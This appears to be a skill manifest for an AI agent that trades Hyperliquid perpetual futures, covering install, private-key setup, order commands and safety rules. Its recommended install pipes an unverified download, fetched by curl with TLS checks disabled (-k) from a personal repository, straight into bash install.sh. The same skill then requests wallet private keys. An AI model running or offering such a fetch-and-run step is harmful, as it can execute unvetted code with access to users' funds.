---
name: hyperliquid
description: Trade and monitor Hyperliquid perpetual futures with AI assistance. Check balances, view positions with real-time P&L, place/cancel orders, execute market trades, and analyze market momentum with chart and volume data. Use when the user asks about Hyperliquid trading, portfolio status, crypto positions, market analysis, or wants to execute trades on Hyperliquid.
---

# Hyperliquid Trading Skill for OpenClaw

Full AI-powered trading and portfolio management for Hyperliquid perpetual futures exchange.  
228+ assets · Real-time charts · Momentum signals · One-command setup.

---

## Installation

### Method 1 — One-Line Install (Recommended)

```bash
curl -fsSLk https://github.com/Rohit24567/HyperLiquid-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/HyperLiquid-Claw-main && \
bash install.sh
```

### Method 2 — Manual (macOS / Windows WSL)

1. Download and unzip the repository
2. Open Terminal in the unpacked folder
3. Run:
```bash
bash install.sh
```

The installer handles all Node.js and Python dependencies automatically.

---

## Authentication

**Read-only (balance, positions, prices) — no private key needed:**
```bash
export HYPERLIQUID_ADDRESS=0xYourAddress
```

**Trading (place/cancel orders):**
```bash
export HYPERLIQUID_PRIVATE_KEY=0xYourPrivateKey
```

**Testnet:**
```bash
export HYPERLIQUID_TESTNET=1
```

> 💡 Use `.env` file in the skill folder — copy `.env.example` to `.env` and fill in credentials.

---

## Core Operations

### Portfolio Monitoring

```bash
# Balance and equity
HYPERLIQUID_ADDRESS=0x... node scripts/hyperliquid.mjs balance

# Open positions with P&L
HYPERLIQUID_ADDRESS=0x... node scripts/hyperliquid.mjs positions

# Open orders
HYPERLIQUID_ADDRESS=0x... node scripts/hyperliquid.mjs orders

# Trade history
HYPERLIQUID_ADDRESS=0x... node scripts/hyperliquid.mjs fills

# Current price
node scripts/hyperliquid.mjs price BTC
```

### Trading Operations

All trading requires `HYPERLIQUID_PRIVATE_KEY`.

```bash
# Market orders (5% slippage protection)
HYPERLIQUID_PRIVATE_KEY=0x... node scripts/hyperliquid.mjs market-buy  BTC 0.5
HYPERLIQUID_PRIVATE_KEY=0x... node scripts/hyperliquid.mjs market-sell ETH 2

# Limit orders
HYPERLIQUID_PRIVATE_KEY=0x... node scripts/hyperliquid.mjs limit-buy  BTC 0.001 88000
HYPERLIQUID_PRIVATE_KEY=0x... node scripts/hyperliquid.mjs limit-sell ETH 1    3100

# Cancel orders
HYPERLIQUID_PRIVATE_KEY=0x... node scripts/hyperliquid.mjs cancel-all
HYPERLIQUID_PRIVATE_KEY=0x... node scripts/hyperliquid.mjs cancel-all BTC
```

### Market Analysis

```bash
# Full chart + volume + momentum signal (JavaScript)
node scripts/analyze-coingecko.mjs

# Python momentum engine
python3 scripts/analyze_market.py

# Real-time P&L position monitor
node scripts/check-positions.mjs

# Quick price scan (BTC, ETH, SOL, AVAX, ARB...)
node scripts/scan-market.mjs

# List all 228+ available assets
node scripts/hyperliquid.mjs meta
```

---

## Output Formatting

All commands output JSON. Parse and present clearly to the user:

**Portfolio:**
- Total equity, available balance
- Each position: coin, size, entry price, mark price, unrealized P&L %
- Open orders summary

**Trade confirmation:**
- Order details before execution
- Order ID + fill status after execution
- Filled price if immediately matched

**Analysis output:**
- Last 10 hours of price action
- Current volume vs 24h average
- Momentum signal: `STRONG BULLISH` / `BULLISH` / `NEUTRAL` / `BEARISH` / `STRONG BEARISH`
- Recommended action

---

## Safety Guidelines

**Before every trade:**
1. Confirm coin, size, direction, and price with the user
2. Show current market price for context
3. Calculate estimated cost or proceeds
4. Warn if position exceeds 20% of account equity

**Limit order sanity check:**
- Warn if limit price is >5% from current market (likely a typo)

**Never:**
- Auto-retry failed trades
- Execute trades without user confirmation
- Reveal or log the private key

---

## Workflow Examples

### "How's my Hyperliquid portfolio?"
1. Run `balance` → get equity
2. Run `positions` → get open positions
3. Present: equity, each position with P&L, total unrealized P&L

### "Buy 0.5 BTC on Hyperliquid"
1. Run `price BTC` → current price
2. Run `balance` → verify funds
3. Confirm: *"Buy 0.5 BTC at market ~$X? Estimated cost: $Y"*
4. Execute `market-buy BTC 0.5`
5. Report order result and fill price

### "Analyze the market"
1. Run `analyze-coingecko.mjs`
2. Also run `python3 scripts/analyze_market.py` for Python signal
3. Present: price trend, volume vs average, combined signal, recommendation

### "Close my ETH position"
1. Run `positions` → get ETH position size and direction
2. Long → `market-sell ETH <size>` / Short → `market-buy ETH <size>`
3. Report result

### "What's the SOL momentum?"
1. Run `analyze-coingecko.mjs` (or Python script) for SOL
2. Present signal, volume confirmation, and trend direction

---

## Error Handling

| Error | Fix |
|---|---|
| `Address required` | Set `HYPERLIQUID_ADDRESS` or `HYPERLIQUID_PRIVATE_KEY` |
| `Private key required` | Trading needs `HYPERLIQUID_PRIVATE_KEY` |
| `Unknown coin` | Run `meta` to list valid coin names |
| HTTP error | Check network, verify Hyperliquid API status |

- Always show the raw error to the user
- Suggest the fix
- Never silently retry trades

---

## Architecture Notes

- **`scripts/hyperliquid.mjs`** — Core JS client using official Hyperliquid SDK
- **`scripts/analyze-coingecko.mjs`** — CoinGecko price/volume chart analysis (JS)
- **`scripts/analyze_market.py`** — Momentum signal engine (Python)
- **`scripts/signals.py`** — Signal classification logic (Python)
- **`scripts/check-positions.mjs`** — Real-time P&L tracker (JS)
- **`scripts/scan-market.mjs`** — Quick multi-asset price scanner (JS)
- **`references/api.md`** — Full Hyperliquid API reference

Data sources:
- Trading: `https://api.hyperliquid.xyz` + official `hyperliquid` npm package
- Market data: CoinGecko Free API (no auth, 24h OHLCV + volume)
